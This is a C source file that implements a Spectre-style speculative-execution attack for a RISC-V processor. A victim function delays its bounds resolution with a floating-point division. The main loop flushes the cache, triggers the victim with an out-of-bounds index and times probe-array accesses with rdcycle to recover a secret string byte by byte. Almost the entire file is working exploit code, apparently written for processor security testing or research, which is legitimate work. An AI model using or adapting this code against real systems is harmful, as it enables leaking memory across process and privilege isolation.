#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

#define ATTACK_SAME_ROUNDS 10 
#define SECRET_SZ 26
#define CACHE_HIT_THRESHOLD 50

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];

char* secretString = "ThisIsPrimitiveAttack2Test";


void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}


uint64_t   str_index = 1;
uint64_t   temp = 0;
uint8_t    dummy = 2;
uint64_t   str[256];

void victim_function(uint64_t idx)
{
    str[1] = idx;

    str_index =  str_index << 1;            
    asm("fcvt.s.lu	fa4, %[in]\n"           
        "fcvt.s.lu	fa5, %[inout]\n"       
        "fdiv.s	fa5, fa5, fa4\n"           
        "fcvt.lu.s	%[out], fa5, rtz\n"  
        : [out] "=r" (str_index)
        : [inout] "r" (str_index), [in] "r" (dummy)
        : "fa4", "fa5");
    str[str_index] = 0;
    temp &= array2[array1[str[1]] * L1_BLOCK_SZ_BYTES];
    dummy = rdcycle();
}


int main(void)
{
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t start, diff;
    static uint64_t results[256];
    printf("the secret key is:%s \n", secretString);

    for(uint64_t len = 0; len < SECRET_SZ; ++len)
	{

        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx)
		{
            results[cIdx] = 0;
        }

        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound)
		{

            flushCache((uint64_t)array2, sizeof(array2));
            victim_function(attackIdx);

            for (uint64_t i = 0; i < 256; ++i)
            {
                uint64_t  uiTemp = 0;  
                start = rdcycle();
                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
                diff = (rdcycle() - start);

                if ( diff < CACHE_HIT_THRESHOLD )
				{
                    results[i] += 1;
                }
            }
        }

        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

        printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]);

        ++attackIdx;
    }

    return 0;
}
